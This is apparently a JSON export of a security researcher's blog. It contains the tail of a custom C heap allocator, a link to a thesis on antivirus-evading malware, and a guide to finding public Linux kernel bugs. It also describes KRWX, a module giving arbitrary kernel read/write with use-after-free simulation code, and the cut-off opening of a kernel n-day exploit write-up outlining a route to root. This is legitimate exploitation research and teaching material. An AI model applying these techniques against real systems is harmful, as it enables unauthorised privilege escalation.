LARGE_BUCKET_MASK     0xFFFFFFFFC000 // 4 PAGES\n//#define LARGE_BUCKET_MASK     TODO\n\n#define FREELIST_REPLACE_BUCKET_THRESHOLD   3\n\n/* 10 seconds */\n#define FREELIST_QUARANTINE\n#define FREELIST_QUARANTINE_WAIT            10\n\n\n#define BUCKET_MAX_SZ   2048\n\ntypedef uint64_t bool;\n#define true 1\n#define false 0\n\nstruct list_head{\n  struct list_head* next;\n  struct list_head* prev;\n};\n\nstruct bucket{\n  struct list_head  buckets;\n  /* Offset of the available alloc inside the bucket */\n  uint16_t  offset;\n  /* How many allocs are freed */\n  uint8_t   freelist_count;\n  uint8_t   freelist[MAX_ALLOCS];\n  void*     allocs[];\n};\n\n/* Single allocations just contain the size of the alloc as metadata */\nstruct alloc{\n  uint16_t size;\n  void*   user[];\n} __attribute__((packed));\n\nvoid* malloc(size_t size);\nvoid free(void* ptr);\nbool __hmalloc_init();\nvoid* __malloc(size_t size);\nsize_t __round_up_size(size_t sz);\nsize_t __bucket_max_allocations(size_t alloc_size);\nstruct bucket* __get_bucket(size_t alloc_size);\nstruct bucket* __get_bucket_from_alloc(struct alloc* target_alloc);\nstatic inline void __update_master_ctrl_bucket(size_t alloc_size, struct bucket* b);\nvoid* __fastpath_new_bucket_alloc(struct bucket* bucket, size_t alloc_size);\nbool __is_freelist_available();\nvoid __dump_bucket(struct bucket* b);\nvoid __dump_alloc(struct alloc* a);\n\n#endif // HMALLOC_H\n\n```\n\n`hmalloc.c`\n```C\n#include \"hmalloc.h\"\n/* \n * TODO: Single buckets are never unmmaped\n */\n\nvoid** bucket_master_ctrl = NULL;\ntime_t freelist_quarantine_time = 0;\n\nsize_t __round_up_size(size_t size) {\n  int power = 32;\n  while(power \u003c size)\n    power*=2;\n  return power;\n}\n\nvoid __dump_bucket(struct bucket* b){\n  DEBUG_PRINT(\"[DEBUG]\\tstruct bucket {\\n\");\n  DEBUG_PRINT(\"\\t\\tnext: %p\\n\", b-\u003ebuckets.next);\n  DEBUG_PRINT(\"\\t\\tprev: %p\\n\", b-\u003ebuckets.prev);\n  DEBUG_PRINT(\"\\t\\toffset: %d\\n\", b-\u003eoffset);\n  DEBUG_PRINT(\"\\t\\tfreelist_count: %d\\n\", b-\u003efreelist_count);\n  for(int i=0; i \u003c b-\u003efreelist_count; i++)\n    DEBUG_PRINT(\"\\t\\tfreelist[%d]: %d\\n\", i, b-\u003efreelist[i]);\n  DEBUG_PRINT(\"\\t\\tallocs: %p\\n\", b-\u003eallocs);\n  DEBUG_PRINT(\"\\t}\\n[/DEBUG]\\n\");\n}\n\nvoid __dump_alloc(struct alloc* a){\n  DEBUG_PRINT(\"[DEBUG]\\tstruct alloc {\\n\");\n  DEBUG_PRINT(\"\\t\\tsize: %d\\n\", a-\u003esize);\n  DEBUG_PRINT(\"\\t\\tuser: %p\\n\", a-\u003euser);\n  DEBUG_PRINT(\"\\t}\\n[/DEBUG]\\n\");\n}\n\nbool __hmalloc_init(){\n  bucket_master_ctrl = mmap(NULL, PAGE_SZ, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, 0, 0);\n  if(bucket_master_ctrl == MAP_FAILED){\n    perror(\"mmap\");\n    return false;\n  }\n  //DEBUG_PRINT(\"[DEBUG] HMALLOC initialized with bucket_master_ctrl = %p\\n\", bucket_master_ctrl);\n  memset(bucket_master_ctrl, 0x0, PAGE_SZ);\n  return true;\n}\n\nstruct bucket* __init_bucket(size_t size){\n  struct bucket* bucket;\n  DEBUG_PRINT(\"Initializing small bucket with %d pages\\n\", SMALL_BUCKET_PAGES);\n  bucket = mmap(NULL, PAGE_SZ * SMALL_BUCKET_PAGES, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, 0, 0);\n  memset(bucket, 0x0, PAGE_SZ * SMALL_BUCKET_PAGES);\n  return bucket;\n}\n\nsize_t __bucket_max_allocations(size_t alloc_size){\n  return ((PAGE_SZ * SMALL_BUCKET_PAGES) - sizeof(struct bucket)) / alloc_size;\n}\n\nstruct bucket* __get_bucket(size_t alloc_size){\n  off_t off = alloc_size - sizeof(void*);\n  return *(void**)((void*) bucket_master_ctrl + off);\n}\n\nstruct bucket* __get_bucket_from_alloc(struct alloc* target_alloc){\n  return (struct bucket*) ((uint64_t) target_alloc \u0026 SMALL_BUCKET_MASK);\n}\n\nstatic inline void __update_master_ctrl_bucket(size_t alloc_size, struct bucket* bck){\n  off_t off = alloc_size - sizeof(void*);\n  *(void**) ((void*) bucket_master_ctrl + off) = bck;\n}\n\nvoid* __fastpath_new_bucket_alloc(struct bucket* b, size_t alloc_size){\n  // return the pointer to the first allocation of a newly allocated bucket\n  struct alloc* alloc = (struct alloc*) b-\u003eallocs;\n  alloc-\u003esize = alloc_size;\n  b-\u003eoffset++;\n  return alloc-\u003euser;\n}\n\nbool __is_freelist_available(){\n#ifdef FREELIST_QUARANTINE\n  if((time(NULL) - freelist_quarantine_time) \u003c FREELIST_QUARANTINE_WAIT){\n    return false;\n  }\n  return true;\n#endif\n  return true;\n}\n\nvoid* malloc(size_t size){\n  void* alloc;\n  if(!bucket_master_ctrl){\n    if(!__hmalloc_init())\n      return NULL;\n  }\n  alloc = __malloc(size);\n  DEBUG_PRINT(\"malloc(%zu) = %p\\n\", size, alloc);\n  return alloc;\n}\n\nvoid* __malloc(size_t input_size){\n  size_t  alloc_size;\n  off_t   bucket_offset;\n  off_t   offset;\n  struct bucket* current_bucket;\n  struct bucket* old_current_bucket;\n  struct bucket* linked_bucket;\n  struct alloc* alloc;\n  uint8_t freelist_count = 0;\n  size_t  bucket_max_allocs = 0;\n\n  /* Size validation */\n  if(input_size == 0)\n    return NULL;\n\n  DEBUG_PRINT(\"\\n+++++++++ MALLOC +++++++++\\n\");\n  alloc_size = __round_up_size(input_size + sizeof(struct alloc));\n  if(alloc_size \u003e SMALL_BUCKET_MAX_SZ){\n    /* TODO: Not implemented */\n    return NULL;\n  }\n\n  /* Retrieve, or initialize, the appropriate bucket based on alloc_size */\n  current_bucket = __get_bucket(alloc_size);\n  /* If the  bucket is not initialized, do it */\n  if(current_bucket == NULL){\n    current_bucket = __init_bucket(alloc_size);\n    if(current_bucket == NULL){\n      perror(\"__init_bucket: mmap\");\n      return NULL;\n    }\n    DEBUG_PRINT(\"[DEBUG] Bucket %zu initialized: %p\\n\", alloc_size, current_bucket);\n    // Store the bucket inside the Bucket Master Control\n    __update_master_ctrl_bucket(alloc_size, current_bucket);\n  }\n  DEBUG_PRINT(\"[DEBUG] current_bucket (%zu) = %p\\n\", alloc_size, current_bucket);\n  __dump_bucket(current_bucket);\n\n  /* 1. Verify if we have freed allocs inside the current_bucket */\n  freelist_count = current_bucket-\u003efreelist_count;\n  if(freelist_count \u0026\u0026 __is_freelist_available()){\n    offset = current_bucket-\u003efreelist[(current_bucket-\u003efreelist_count - 1)];\n    alloc = (void*) current_bucket-\u003eallocs + ( offset * alloc_size);\n    current_bucket-\u003efreelist_count--;\n    DEBUG_PRINT(\"[DEBUG] Alloc retrieved from the freelist with offset %ld: %p\\n\", offset, alloc);\n    return alloc-\u003euser;\n  }\n\n  /* 2. Verify if we can alloc from the current bucket */\n  bucket_max_allocs = __bucket_max_allocations(alloc_size);\n  bucket_offset = current_bucket-\u003eoffset;\n  if(bucket_offset != bucket_max_allocs){\n    // We still have allocs to return!\n    if(bucket_offset \u003e bucket_max_allocs){\n      DEBUG_PRINT(\"!! bucket_offset should never exceeds its maximum allocations!\\n\");\n      return NULL;\n    }\n    alloc = (struct alloc*) ((void*) current_bucket-\u003eallocs + (bucket_offset * alloc_size));\n    alloc-\u003esize = alloc_size;\n    current_bucket-\u003eoffset++;\n    __dump_alloc(alloc);\n    return alloc-\u003euser;\n  }\n\n  // From now on, bucket_offset == bucket_max_allocs (e.g. bucket is full)\n  /* 3. If we have linked buckets, verify them as well */\n  // Traverse backwards first\n  if(current_bucket-\u003ebuckets.prev){\n    linked_bucket = (struct bucket*) current_bucket-\u003ebuckets.prev;\n    while(linked_bucket != NULL){\n      // Traverse\n      DEBUG_PRINT(\"[DEBUG] linked bucket %p\\n\", linked_bucket);\n      __dump_bucket(linked_bucket);\n\n      if(linked_bucket-\u003efreelist_count == 0){\n        linked_bucket = (struct bucket*) linked_bucket-\u003ebuckets.prev;\n        continue;\n      }\n      \n      // If here we have a freed alloc\n      offset = linked_bucket-\u003efreelist[(linked_bucket-\u003efreelist_count - 1)];\n      alloc = (void*) linked_bucket-\u003eallocs + ( offset * alloc_size);\n      linked_bucket-\u003efreelist_count--;\n\n      // Verify if this bucket has enough freed allocs to replace the current bucket\n      if(linked_bucket-\u003efreelist_count \u003e= FREELIST_REPLACE_BUCKET_THRESHOLD){\n        __update_master_ctrl_bucket(alloc_size, linked_bucket);\n      }\n      // Return the alloation directly from here\n      DEBUG_PRINT(\"[DEBUG] Returing alloc %p from bucket %p with traversing\\n\", alloc, linked_bucket);\n      return alloc-\u003euser;\n    }\n  }\n\n  // Traverse forward\n  if(current_bucket-\u003ebuckets.next){\n    linked_bucket = (struct bucket*) current_bucket-\u003ebuckets.next;\n    while(linked_bucket != NULL){\n      // Traverse\n      DEBUG_PRINT(\"[DEBUG] linked bucket %p\\n\", linked_bucket);\n      __dump_bucket(linked_bucket);\n\n      if(linked_bucket-\u003efreelist_count == 0){\n        linked_bucket = (struct bucket*) linked_bucket-\u003ebuckets.next;\n        continue;\n      }\n      \n      // If here we have a freed alloc\n      offset = linked_bucket-\u003efreelist[(linked_bucket-\u003efreelist_count - 1)];\n      alloc = (void*) linked_bucket-\u003eallocs + ( offset * alloc_size);\n      linked_bucket-\u003efreelist_count--;\n\n      // Verify if this bucket has enough freed allocs to replace the current bucket\n      if(linked_bucket-\u003efreelist_count \u003e= FREELIST_REPLACE_BUCKET_THRESHOLD){\n        DEBUG_PRINT(\"[DEBUG] Master bucket updated with %p\\n\", linked_bucket);\n        __update_master_ctrl_bucket(alloc_size, linked_bucket);\n      }\n      // Return the alloation directly from here\n      DEBUG_PRINT(\"[DEBUG] Returing alloc %p from bucket %p with traversing\\n\", alloc, linked_bucket);\n      return alloc-\u003euser;\n    }\n  }\n\n  /* 4. If everything fails, allocate a new bucket */\n  old_current_bucket = current_bucket;\n  current_bucket = __init_bucket(alloc_size);\n  if(current_bucket == NULL){\n      perror(\"__init_bucket: mmap\");\n      return NULL;\n  }\n  DEBUG_PRINT(\"[DEBUG] New bucket %zu initialized: %p\\n\", alloc_size, current_bucket);\n\n  // update list_heads\n  old_current_bucket-\u003ebuckets.next = (struct list_head*) \u0026current_bucket-\u003ebuckets.next;\n  current_bucket-\u003ebuckets.prev = (struct list_head*) \u0026old_current_bucket-\u003ebuckets.next;\n\n  // Update the Bucket Master Control with the new bucket\n  __update_master_ctrl_bucket(alloc_size, current_bucket);\n\n  alloc = __fastpath_new_bucket_alloc(current_bucket, alloc_size);\n  __dump_alloc(alloc);\n  __dump_bucket(current_bucket);\n  return alloc;\n}\n\nvoid free(void* ptr){ \n  struct alloc* current_alloc;\n  struct bucket* current_bucket;\n  uint16_t offset;\n\n  if(ptr == NULL){ return; }\n  DEBUG_PRINT(\"\\n+++++++++ FREE +++++++++\\n\");\n\n  /* 1. Retrieve the bucket based on the size */\n  current_alloc = ptr - sizeof(struct alloc);\n  DEBUG_PRINT(\"[DEBUG] Freeing alloc %p\\n\", current_alloc);\n\n  if(current_alloc-\u003esize \u003e SMALL_BUCKET_MAX_SZ) {\n    // Should never be here since we still don't deal with that sizes\n    return;\n  }\n\n  current_bucket = __get_bucket_from_alloc(current_alloc);\n  DEBUG_PRINT(\"[DEBUG] Retrieved current bucket for %d is: %p\\n\", current_alloc-\u003esize, current_bucket);\n\n  /* 2. Update the bucket freelist count and freelist array */\n  offset = ( (void*) current_alloc - (void*) current_bucket-\u003eallocs ) / current_alloc-\u003esize;\n  current_bucket-\u003efreelist[current_bucket-\u003efreelist_count] = offset;\n  current_bucket-\u003efreelist_count++;\n  freelist_quarantine_time = time(NULL);\n  __dump_bucket(current_bucket);\n}\n```","lastmodified":"2025-04-14T14:14:33.955126385Z","tags":null},"/notes/How-To-Write-FUD-Malware-Thesis":{"title":"How to Write FUD Malware [Thesis]","content":"\nI wrote this thesis in the last high school year (2017), it was my introduction to the low-level world that quickly turned into the exploitation part of it.\nBtw it's about malware development on Windows environments with the discovery of some FUD techniques that could bypass some Antivirus defenses (at the time of writing).\n\n[How To Write FUD Malware (Thesis)](https://1day.dev/notes/images/fud/fud_thesis.pdf)\n\nIf you fear PDF 0days, check it out from [exploit-db](https://www.exploit-db.com/docs/42206) (the [english](https://www.exploit-db.com/docs/english/42250-how-to-write-fully-undetectable-malware---english-translation.pdf) version has not been translated by me).","lastmodified":"2025-04-14T14:14:33.955126385Z","tags":null},"/notes/Hunting-for-Linux-kernel-public-vulnerabilities":{"title":"Hunting for Linux kernel public vulnerabilities","content":"\n\n## Introduction\nRecently was looking for a vulnerability that permitted me to practise what I've learned during the last few months on Linux Kernel Exploitation with a \"real-life\" scenario. Since I had a week to dedicate my time in Hacktive Security to deepen a specific argument, I decided to search for a public vulnerability without a public exploit to develop it by myself. The next blog post will be related to the development of that 1day, this one is a quick post about how I discovered and choose the vulnerability using online sources, since I didn't found anything similar online.\n\n## TL;DR\nThis blog post is about public resourses to identify known vulnerabilities in the Linux Kernel in order to practise some Kernel Exploitation in a real-life scenario. These resources includes: BugZilla, SyzBot, changelogs and git logs.\n\n## Public bugs\nThe first thing I asked myself was: how do I find a suitable bug for my purpose? I excluded searching it by CVE since not all vulnerabilities have an assigned CVE (and usually they are the most \"famous\" ones) and that's when I used the most powerful hacking skill: googling. That led me to various resources that I would like to share today starting by saying that that's only the result of my personal work that could not reflect the best way to perform the same job. That said, this is what I've used to find my \"matched\" Nday:\n\n-   Bugzilla\n-   SyzBot\n-   Changelogs\n-   Git log\n\nKernel changelogs is definitely my favourite one but let's say few words on all of them.\n\n### BugZilla\n[BugZilla](https://bugzilla.kernel.org/) is the standard way to [report bugs](https://www.kernel.org/doc/html/v4.19/admin-guide/reporting-bugs.html) in the upstream Linux kernels. You can find interesting vulnerabilities organised by subsystem (e.g. Networking with IPv4 and IPv6 or file system with ext* types and so on) and you can also search for keywords (such as \"overflow\", \"heap\", \"UAF\" and so on ..) using the standard search or the more advanced one. The personal downside is the mix of a lot of \"non vulnerabilities\", hangs and stuff like that. Also, you do not have the most powerful search options (e.g. some bash). However, it is still a good option and I personally pinned few vulnerabilities that i excluded afterwards.\n\n### Syzbot\n\"syzbot is a continuous fuzzing/reporting system based on syzkaller fuzzer\" [source](https://lwn.net/Articles/749910/).  \nNot the best GUI but at least you can have a lot of potentially open and fixed vulnerabilties. There isn't a built-in search option but you can use your browser's one or parse the HTML with an HTML parser. One of the downside, beyond the lack of searching, is the presence of tons of false-positives (in the \"Open section\"). However, upsides are pretty good: you can find open vulnerabilites (still not fixed), reproducers (C or syzlang), fixed commits and reported issues have the syzkaller nomenclature that is pretty self-explainationary.\n\n#### Syzkaller-bugs (Google Group)\nThe lack of a search functionality in syz-bot is well replaced by the [\"syzkaller-bugs\" Google Group](https://groups.google.com/g/syzkaller-bugs/) from where you can find syz-bot reported bugs with additional information from the comment section and an enanched search bar. I really enjoy this option !\n\n### Changelogs\nThat's my favourite method: download all changelogs from the [kernel CDN](https://cdn.kernel.org/pub/linux/kernel/VERSION/) of your desired kernel version and you can enjoy all downloaded files with your favourite bash commands. This approach is similar to search from git commits but with the advantage that it is way faster. With some bash-fu, you can download all changelogs for a target kernel version (e.g. 4.x) with the following inline:Â `URL=https://cdn.kernel.org/pub/linux/kernel/v4.x/ \u0026\u0026 curl $URL | grep \"ChangeLog-4.9\" | grep -v '.sign' | cut -d \"\\\"\" -f 2 | while read line; do wget \"$URL/$line\"; done`.  \nOnce all changelogs have been downloaded it's possible toÂ `grep`Â for juicy keywoards like UAF, OOB, overflow and so on. I found very useful to display text before and after the selected keyword, like:Â `grep -A5 -B5 UAF *`. In that way, you can instantly have quick information about vulnerability details, impacted subsystem, limitations, ..  \nFor each identified vulnerability, it's possible to see its patch by diffing the patch commit with the previous one (linux source from git is needed):Â `git diff \u003ccommit before\u003e \u003ccommit patch\u003e`.\n\n### Git log\nAs said before, this is a similar approach to the \"Changelogs\" method. The concept is pretty simple: clone the github repository and search for juicy keywoards in the commit history. You can do that with the following commands:\n\n```bash\ngit clone git://git.kernel.org/pub/scm/linux/kernel/git/stable/linux-stable.git\ncd linux-stable\ngit checkout -f \u003cTAG -\u003e # e.g. git checkout -f v4.9.316 (from https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git)\ngit log \u003e ../git.log\n```\n\nIn that way, you can do the same thing as before onÂ `git.log`Â file. The big downside, however, is that the file is too big and it takes more time (11.429.573 lines on 4.9.316). That's the reason why I prefer the \"Changelog\" method.\n\n## Personal Experience\nI was searching for an Use-After-Free vulnerability and I started to search for it in all mentioned resources: BugZilla, SyzBot, Changelogs and git history. I wrote them down in a table with a resume description in order to further analyze them later on. I started to dig into few of them viewing their patch and source code in order to understand reachability, compile dependencies and exploitability. I strumbled into an interesting one: a vulnerability in the RAWMIDI interface (commit c13f1463d84b86bedb664e509838bef37e6ea317). I discovered it with the \"Changelog\" method, by searching for theÂ \"UAF\"Â keyword reading the previous and next five lines:Â `grep -A5 -B5 UAF *`. By seeing its behaviours, I was convinced to go with that vulnerability, an Use-After-Free triggered in a race condition.\n\n## Conclusion\nI illustrated my experience on finding a public vulnerability to practise some linux kernel exploitation using public resources. The next blog post will be about the mentioned vulnerability in the RAWMIDI interface with all steps involved in the exploitation phase.\n\n## References\n- https://bugzilla.kernel.org/  \n- https://www.kernel.org/doc/html/v4.19/admin-guide/reporting-bugs.html  \n- https://lwn.net/Articles/749910/  \n- https://groups.google.com/g/syzkaller-bugs/  \n- https://cdn.kernel.org/pub/linux/kernel/VERSION/\n","lastmodified":"2025-04-14T14:14:33.955126385Z","tags":null},"/notes/KRWX-Kernel-Read-Write-Execute":{"title":"KRWX: Kernel Read Write Execute","content":"\n## Introduction\ngithub project: https://github.com/kiks7/KRWX\n\nDuring the last few months/year I was studying and approaching the Kernel Exploitation subject and during this journey I developed few tools that assissted me (and currently assist) on better understanding specific topics. Today I want to release my favourine one: KRWX (**K**ernel **R**ead **W**rite **E**xecute). It is a simple LKM (Linux Kernel Module) that lets you play with kernel memory, allocate and free kernel objects directly from user-land!\n\n## What\nThe main goal of this tool is to use kernel functions from userland (from C code) in order to avoid slower kernel debugging and developing of kernel modules to demostrate specific vulnerabilities (instead, you can emulate them with provided IOCTLs). Also, it can assist the exploitation phase.\nThese are the project main features (all these features are accessible from a low level user from user-land):\n- Read and write into kernel memory\n- Read entire blocks of memory\n- Arbitrary allocate objects directly calling `kmalloc`\n- Arbitrary `kfree` objects (and also free arbitrary addresses, if you want)\n- Allocate/free multiple objects\n- Log every `copy_[from|to]_user`/ `kmalloc`/`kfree` called by the KRWX module through hooking (readable from `dmesg`).\n\nMainly, a more powerful read and write primitive :]\n\n## Why\nInitially I was writing this module to study the SLUB memory allocator in Linux by allocating, freeing and re-allocating arbitrary chunks easily from an userland process. That automatically leads to study also some exploitation techniques that, with this module, I found a lot easier to understand since you can easily play with kernel memory as you are the god of your system. Then I started to heavily use it for multiple purposes and that's the reason why I'm sharing it.\n\n## How\nThese are some exported functions:\n- `void* kmalloc(size_t arg_size, gfp_t flags)` -\u003e Allocate a chunk with specific `size` and `flag` options.\n-  `int kfree(void* address)` -\u003e Free arbitrary chunks by their `address` (also, you can free arbitrary memory).\n- `unsigned long int kread64(void* address)` -\u003e Read 8 bytes of memory at `address`.\n- `int kwrite64(void* address, uint64_t value)` -\u003e Write 8 bytes specified by `value` into `address`.\n- `void read_memory(void* start_address, size_t size)` -\u003e Read `size` amount of memory starting from `start_address`.\n\nAnd, since one of my favourite hobby is overengineer and I'm lazy enough to do not want to write loops everytime:\n- `void multiple_kmalloc(void** array, uint32_t n_objs, uint32_t size)` -\u003e Allocate `n_objs` number of objects with specified `size` and return addresses in `array`.\n- `void multiple_kfree(void** array, uint64_t to_free[], uint64_t to_free_size)` -\u003e Free specified addresses in `to_free` from `array` (`to_free_size` is the size of the `to_free` array).\n\n If you're interested in the source code feel free to check out the github project.\n\n## Examples\n### Allocate, free and read arbitrary chunks\nYou can find the full source code in `example/01.c`. Here will follows some snippets and a little walkthrough.\n\nFirst, include the external library and call its initialization function (`init_krwx`):\n```C\n#include \"./lib/krwx.h\"\n\nint main(){\n\tinit_krwx();\n\t[..]\n}\n\t\n```\nSo, 10 chunks with size 256 are allocated using `multiple_kmalloc`, and the memory of the 7th allocation is read using `read_memory` after writing `0x4141414141414141` at its first bytes:\n```C\nvoid* chunks[10];\nmultiple_kmalloc(\u0026chunks, 10, 256);\nkwrite64(chunks[7], 0x4141414141414141);\nread_memory(chunks[7], 0x10);\n```\n\nThe indexes 3, 4 and 7 of the `chunks` array are freed using `multiple_kfree`:\n```C\nuint64_t to_free[] = {3, 4, 7};\nmultiple_kfree(\u0026chunks, \u0026to_free, ( sizeof(to_free) / sizeof(uint64_t) ) );\n```\n\nOnce they are freed, new chunks with the same size are allocated and initialized with `0x4343434343434343`, and the memory of the 7h freed chunk is displayed using `read_memory` again:\n```C\nkwrite64(kmalloc(256, _GFP_KERN), 0x4343434343434343);\nkwrite64(kmalloc(256, _GFP_KERN), 0x4343434343434343);\nkwrite64(kmalloc(256, _GFP_KERN), 0x4343434343434343);\nkwrite64(kmalloc(256, _GFP_KERN), 0x4343434343434343);\nkwrite64(kmalloc(256, _GFP_KERN), 0x4343434343434343);\nread_memory(chunks[7], 0x10);\n\n```\n\nThe result is:\n```bash\n[*] Allocating 10 chunks with size 256\n[*] Allocated @0xffffffc00503b900\n[*] Allocated @0xffffffc00503b600\n[*] Allocated @0xffffffc00503b100\n[*] Allocated @0xffffffc00503bc00\n[*] Allocated @0xffffffc00503b400\n[*] Allocated @0xffffffc00503b000\n[*] Allocated @0xffffffc00503b500\n[*] Allocated @0xffffffc00503b800\n[*] Allocated @0xffffffc00503ba00\n[*] Allocated @0xffffffc00503bd00\n0xffffffc00503b800:     0x4141414141414141 0xffffffc0001a8928\n[*] Freeing @0xffffffc00503bc00\n[*] Freeing @0xffffffc00503b400\n[*] Freeing @0xffffffc00503b800\n0xffffffc00503b800:     0x4343434343434343 0xffffffc0001a8928\n```\n\nWith  few lines of code has been demostrated how  our 7th chunk has been replaced with a new one after it has been freed (the `read_memory` targeted the `chunks[7]`). \nAs simple as it is, it has been written for demonstration purposes.\n\n### Use-After-Free\nTo simulate a UAF scenario it's simple as few lines of code:\n```C\nvoid* chunk = kmalloc(\u003cSIZE\u003e, \u003cFLAGS\u003e);\nkfree(chunk);\n// Allocate your target chunk\n// Simulate UAF using k[write|read]64()\n```\n\nFor example, if we want to simulate an attack scenario where we want to replace our vulnerable freed chunk with a target object (for example an `iovec` struct) we can allocate a chunk with `kmalloc` and later  `kfree` it just before allocating the target structure:\n```C\n// Allocate the vulnerable object\nvoid* chunk = kmalloc(150, _GFP_KERN);\n// Allocate target object\nstruct iovec iov[10] = {0};\nchar iov_buf[0x100];\niov[0].iov_base = iov_buf;\niov[0].iov_len = 0x1000;\niov[1].iov_base = iov_buf;\niov[1].iov_len = 0x1337;\nint pp[2];\npipe(pp);\nif(!fork()){\n\tkfree(chunk); // Freeing the chunk just before allocating the iovec\n\treadv(pp[0], iov, 10); // allocate iovec and blocks (keeping the object in the kernel) \n\texit(0);\n}\nsleep(1); // Give time to the child process\nread_memory(chunk, 0x40);\n\n\n```\n\nThen, with `read_memory` we can show the block of memory in our interest and as you can see from the following output, our arbitrary allocated/freed object has been replaced with the target object: \n```C\nAllocated chunk @0xffffffc0052c5a00\n0xffffffc0052c5a00:     0x0000007fd311ff58 0x0000000000001000\n0xffffffc0052c5a10:     0x0000007fd311ff58 0x0000000000001337\n0xffffffc0052c5a20:     0x0000000000000000 0x0000000000000000\n0xffffffc0052c5a30:     0x0000000000000000 0x0000000000000000\n```\n\nInstead of just print the content, you can simulate a UAF read/write using `k[read|write]` and play with it.\n\nThe full code of this example can be found in `client/example/02.c`\n\n## Setup\nTo compile the module change the `K` variable in the `Makefile` with your compiled kernel root directory and compile with `make`, then `insmod`.\n\n## Conclusions\nPersonally, I used it to study the SLUB allocator, understand UAF/Heap Overflows/Double Free/userfaultd and some hardening features in the kernel, but it can assist the exploitation phase too or more. Blog posts on some Kernel vulnerabilities and their attack methodologies will follow these months and this module will come useful to demonstrate them. So, stay tuned and enjoy !\n\nPS. The \"Execute\" part of the name will be a future implementation to control `pc/rip`.","lastmodified":"2025-04-14T14:14:33.955126385Z","tags":null},"/notes/Linux-Kernel-n-day-exploit-development-CVE-2020-27786":{"title":"Linux Kernel n-day exploit development","content":"## Introduction\nIn the previous article ([[Hunting for Linux kernel public vulnerabilities]]) I described how I identified a good candidate vulnerability using public resources to practise some exploitation techiques. In this blog post I will detail the exploitation phase of a race condition that leads to an Use-After-Free in Linux kernel 4.9.223.\n## TL;DR\nThe vulnerability is a Race Condition that causes a write Use-After-Free. The race window has been extended using the userfaultd technique handling page faults from user-space and using `msg_msg` to leak a kernel address and I/O vectors to obtain a write primitive. With the write primitive, the `modprobe_path` global  variable has been overwritten and a root shell popped.\n\n## RAWMIDI interface\nBefore facing the vulnerability, let's see few important things needed to follow this write-up. The vulnerable driver is exposed as a character device in `/dev/snd/midiC0D*` (or similar name based on the platform) and depends on [CONFIG_SND_RAWMIDI](https://elixir.bootlin.com/linux/v4.9.223/source/sound/core/Kconfig#L21). It exposes the following file operations:\n```C\n// https://elixir.bootlin.com/linux/v4.9.224/source/sound/core/rawmidi.c#L1507\nstatic const struct file_operations snd_rawmidi_f_ops =\n{\n\t.owner =\tTHIS_MODULE,\n\t.read =\t\tsnd_rawmidi_read,\n\t.write =\tsnd_rawmidi_write,\n\t.open =\t\tsnd_rawmidi_open,\n\t.release =\tsnd_rawmidi_release,\n\t.llseek =\tno_llseek,\n\t.poll =\t\tsnd_rawmidi_poll,\n\t.unlocked_ioctl =\tsnd_rawmidi_ioctl,\n\t.compat_ioctl =\tsnd_rawmidi_ioctl_compat,\n};\n```\n\nThe ones we are interesed into are `open`, `write` and `unlocked_ioctl`.\n\n### open\nThe open ([snd_rawmidi_open](https://elixir.bootlin.com/linux/v4.9.223/source/sound/core/rawmidi.c#L374)) operation allocates everything needed to interact with the device, but what is just necessary to know for us is the first allocation of `snd_rawmidi_runtime-\u003ebuffer` as `GFP_KERNEL` with a size of 4096 (PAGE_SIZE) bytes. This is the [snd_rawmidi_runtime](https://elixir.bootlin.com/linux/v4.9.223/source/include/sound/rawmidi.h#L67) struct:\n```C\nstruct snd_rawmidi_runtime {\n\tstruct snd_rawmidi_substream *substream;\n\tunsigned int drain: 1,\t/* drain stage */\n\t\t     oss: 1;\t/* OSS compatible mode */\n\t/* midi stream buffer */\n\tunsigned char *buffer;\t/* buffer for MIDI data */\n\tsize_t buffer_size;\t/* size of buffer */\n\tsize_t appl_ptr;\t/* application pointer */\n\tsize_t hw_ptr;\t\t/* hardware pointer */\n\tsize_t avail_min;\t/* min avail for wakeup */\n\tsize_t avail;\t\t/* max used buffer for wakeup */\n\tsize_t xruns;\t\t/* over/underruns counter */\n\t/* misc */\n\tspinlock_t lock;\n\twait_queue_head_t sleep;\n\t/* event handler (new bytes, input only) */\n\tvoid (*event)(struct snd_rawmidi_substream *substream);\n\t/* defers calls to event [input] or ops-\u003etrigger [output] */\n\tstruct work_struct event_work;\n\t/* private data */\n\tvoid *private_data;\n\tvoid (*private_free)(struct snd_rawmidi_substream *substream);\n};\n```\n\n### write\nAfter having allocated everything from the `open` operation, we can write into the file descriptor like `write(fd, \u0026buf, 10)`. In that way, it will fill 10 bytes into the `snd_rawmidi_runtime-\u003ebuffer` and using `snd_rawmidi_runtime-\u003eappl_ptr` it will remember the offset to start writing again later.\nIn order to write into that buffer, the driver does the following calls: [snd_rawmidi_write](https://elixir.bootlin.com/linux/v4.9.223/source/sound/core/rawmidi.c#L1309) =\u003e [snd_rawmidi_kernel_write1](https://elixir.bootlin.com/linux/v4.9.223/source/sound/core/rawmidi.c#L1242) =\u003e `copy_from_user`\n\n\n### ioctl\nThe [snd_rawmidi_ioctl](https://elixir.bootlin.com/linux/v4.9.223/C/ident/snd_rawmidi_ioctl) is responsible to handle IOCTL commands and the one we are interested in is `SNDRV_RAWMIDI_IOCTL_PARAMS` that calls [snd_rawmidi_output_params](https://elixir.bootlin.com/linux/v4.9.223/source/sound/core/rawmidi.c#L637) with user-controllable parameter:\n```C\nint snd_rawmidi_output_params(struct snd_rawmidi_substream *substream,\n\t\t\t      struct snd_rawmidi_params * params)\n{\n\t// [..] few checks\n\tif (params-\u003ebuffer_size != runtime-\u003ebuffer_size) {\n\t\tnewbuf = kmalloc(params-\u003ebuffer_size, GFP_KERNEL); //[1]\n\t\tif (!newbuf)\n\t\t\treturn -ENOMEM;\n\t\tspin_lock_irq(\u0026runtime-\u003elock);\n\t\toldbuf = runtime-\u003ebuffer;\n\t\truntime-\u003ebuffer = newbuf; // [2]\n\t\truntime-\u003ebuffer_size = params-\u003ebuffer_size;\n\t\truntime-\u003eavail = runtime-\u003ebuffer_size;\n\t\truntime-\u003eappl_ptr = runtime-\u003ehw_ptr = 0;\n\t\tspin_unlock_irq(\u0026runtime-\u003elock);\n\t\tkfree(oldbuf); //[3]\n\t}\n\t// [..]\n}\n```\n\nThis IOCTL is crucial for this vulnerability. With this command it's possible to re-size the internal buffer with an arbitrary value reallocating it[1] and later replace that buffer with the older one [2], that will be freed[3].\n\n## Vulnerability Analysis\nThe vulnerability has been patched by the commit \"c13f1463d84b86bedb664e509838bef37e6ea317\" that introduced a 